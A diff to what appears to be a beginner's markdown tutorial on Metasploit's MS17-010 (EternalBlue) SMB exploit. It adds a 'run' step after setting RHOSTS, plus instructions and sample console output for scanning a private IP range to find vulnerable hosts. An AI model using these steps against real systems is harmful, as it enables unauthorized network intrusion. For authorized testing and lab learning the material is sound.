@@ -58,7 +58,7 @@ To use it execute:
 use 2
 ```
 
-# Set the target
+# `set` The target and `run`
 After selecting what vulnarability to use, set the target in options
 ```
 options
@@ -104,4 +104,34 @@ DO:
 
 ```
 set RHOSTS <target ip>
+run
 ```
+
+if not sure which port can be attack, `use 24` (`auxiliary/scanner/smb/smb_ms17_010`) to scan the port
+```
+set rhosts <ip range>
+run
+```
+
+Example:
+```
+msf auxiliary(scanner/smb/smb_ms17_010) > set rhosts 172.16.0.0-172.16.0.100
+rhosts => 172.16.0.0-172.16.0.100
+msf auxiliary(scanner/smb/smb_ms17_010) > run
+[-] 172.16.0.0:445        - Rex::ConnectionTimeout: The connection with (172.16.0.0:445) timed out.
+[-] 172.16.0.1:445        - Rex::ConnectionTimeout: The connection with (172.16.0.1:445) timed out.
+[-] 172.16.0.2:445        - Rex::ConnectionRefused: The connection was refused by the remote host (172.16.0.2:445).
+[-] 172.16.0.3:445        - Rex::ConnectionTimeout: The connection with (172.16.0.3:445) timed out.
+[-] 172.16.0.4:445        - Rex::ConnectionTimeout: The connection with (172.16.0.4:445) timed out.
+[-] 172.16.0.5:445        - Rex::ConnectionTimeout: The connection with (172.16.0.5:445) timed out.
+[-] 172.16.0.6:445        - Rex::ConnectionTimeout: The connection with (172.16.0.6:445) timed out.
+[-] 172.16.0.7:445        - Rex::ConnectionTimeout: The connection with (172.16.0.7:445) timed out.
+[-] 172.16.0.8:445        - Rex::ConnectionTimeout: The connection with (172.16.0.8:445) timed out.
+[-] 172.16.0.9:445        - Rex::ConnectionTimeout: The connection with (172.16.0.9:445) timed out.
+[-] 172.16.0.10:445       - Rex::ConnectionTimeout: The connection with (172.16.0.10:445) timed out.
+[*] Scanned  11 of 101 hosts (10% complete)
+[-] 172.16.0.11:445       - Rex::ConnectionTimeout: The connection with (172.16.0.11:445) timed out.
+[-] 172.16.0.12:445       - Rex::ConnectionTimeout: The connection with (172.16.0.12:445) timed out.
+```
+
+if [+] apears means the port is vulnarable to this type of attack
